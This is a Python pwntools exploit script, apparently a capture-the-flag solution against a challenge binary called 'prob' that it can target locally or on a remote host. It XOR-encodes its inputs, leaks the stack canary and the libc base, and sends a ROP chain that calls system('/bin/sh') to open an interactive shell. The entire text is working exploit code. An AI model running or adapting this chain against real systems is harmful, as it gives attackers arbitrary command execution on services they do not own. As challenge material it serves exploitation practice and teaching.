from pwn import *

context.arch = 'amd64'
BINARY_PATH = "./prob"

def conn():
    if len(sys.argv) == 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process(BINARY_PATH)
    return p

def xrop_gen(payload: bytes):
    ret = (payload[0] ^ payload[1]).to_bytes(1, 'little')
    for ch in payload[1:]:
        ret += (ch ^ ret[-1]).to_bytes(1, 'little')
    print("xrop_gen: ", ret)
    return ret
    
p = conn()
p.sendlineafter("Input: ", xrop_gen(b"B" + b"A"*0x17))
p.recvline()
canary = u64(b"\x00" + p.recv(7))
print(f"canary: {hex(canary)}")

p.sendlineafter("Input: ", xrop_gen(b"B" + b"A"*0x26))
p.recvline()
libc_base = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x29d90
print(f"libc_base: {hex(libc_base)}")

libc = ELF("./libc.so.6")
libc.address = libc_base
rop = ROP(libc)


prdi = rop.rdi[0]
payload = b" exit".ljust(0x19, b"\x00") + p64(canary) + p64(0x0) + p64(prdi + 1) + p64(prdi) +\
    p64(libc.search(b"/bin/sh").__next__()) + p64(libc.symbols["system"])
p.sendlineafter("Input: ", xrop_gen(payload))
p.interactive()